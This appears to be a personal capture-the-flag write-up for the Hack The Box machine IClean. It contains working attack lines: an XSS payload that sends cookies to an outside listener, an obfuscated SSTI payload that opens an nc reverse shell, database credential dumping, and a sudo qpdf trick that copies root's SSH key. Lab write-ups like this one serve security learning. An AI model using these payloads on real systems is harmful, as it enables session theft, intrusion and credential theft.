**Ping**
![[Pasted image 20240712232653.png]]

**Nmap Scans**
```
mapit 10.10.11.12
```

Nmap Default Scan
![[Pasted image 20240712232800.png]]

Nmap Service and Script Scans
![[Pasted image 20240712232839.png]]

Nmap All Port Scans
![[Pasted image 20240712233200.png]]

Hosts file
![[Pasted image 20240712233147.png]]

Gobuster Scan
```
gobuster dir -u http://capiclean.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobustet.txt
```
![[Pasted image 20240712233231.png]]

![[Pasted image 20240712234805.png]]
On Port 80 http://capiclean.htb/
![[Pasted image 20240712233319.png]]

Login page is not vulnerable to sql injection and default creds not worked

But we can send quote request, will try to exploit this with xss attack
```
%3Cimg%20src%3Dx%20onerror%3Dfetch%28%22http%3A%2F%2F10.10.14.6%3A4444%2F%22%2Bdocument.cookie%29%3B%3E
```
This is url encoded, the original payload is below
```
<img src=x onerror=fetch("http://10.10.14.6:4444/"+document.cookie);>
```
![[Pasted image 20240713000228.png]]

Started nc listener and got a session id
![[Pasted image 20240713000300.png]]
```
eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZpFuEQ.-uIfisSAJmaIpUoJ9OjAsGj6LNc
```

Using Cookie editor extension I have added the session Cookie to the site and accessed the forbidden directory /dashboard and it worked....!
![[Pasted image 20240713000926.png]]

On http://capiclean.htb/dashboard
![[Pasted image 20240713000947.png]]

First generated the invoice
![[Pasted image 20240713001317.png]]

Then QR
![[Pasted image 20240713001409.png]]

![[Pasted image 20240713001425.png]]

Now will analyse the request response
And found the vulnerable parameter, it is qr_link and vulnerable to SSTI
![[Pasted image 20240713001830.png]]


Will Jump to Initial Foothold.....!

After a lot of research, found way to get reverse shell https://medium.com/@amajatsoufiane/cracking-iclean-machine-hack-the-box-iclean-machine-walkthrough-b604fe430458 this article will explain how to trick the server which as SSTI to achieve RCE
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.6 443>/tmp/f  
')|attr('read')()}}
```

Then got a reverse shell as www-data
![[Pasted image 20240713003310.png]]

Found database password
![[Pasted image 20240713003626.png]]
![[Pasted image 20240713003606.png]]

Can see the databases
```
mysql --database capiclean -e 'show databases;' -u iclean -p
```
![[Pasted image 20240713003752.png]]

Found the Consuela password hash
```
mysql --database capiclean -e 'use capiclean; show tables; select * from users' -u iclean -p
```
![[Pasted image 20240713004017.png]]

Found consuela Password, it is **simple and clean**
![[Pasted image 20240713004420.png]]

Switched to Consuela
![[Pasted image 20240713004556.png]]

**User.txt**
![[Pasted image 20240713004641.png]]




Will Jump to Privilege Escalation.....!


Sudo Privilege
![[Pasted image 20240713005609.png]]

We can read any file room root directory using this binary, check this link for qpdf functionality https://qpdf.readthedocs.io/en/stable/cli.html

Used the command to get root's id_rsa 
```
sudo /usr/bin/qpdf --qdf sudo /usr/bin/qpdf --qdf --add-attachment /root/.ssh/id_rsa -- --empty ./id_rsa
```
![[Pasted image 20240713005755.png]]

Will get a root session via ssh
![[Pasted image 20240713005838.png]]

**Root.txt**
![[Pasted image 20240713005913.png]]





Done with IClean.....:)
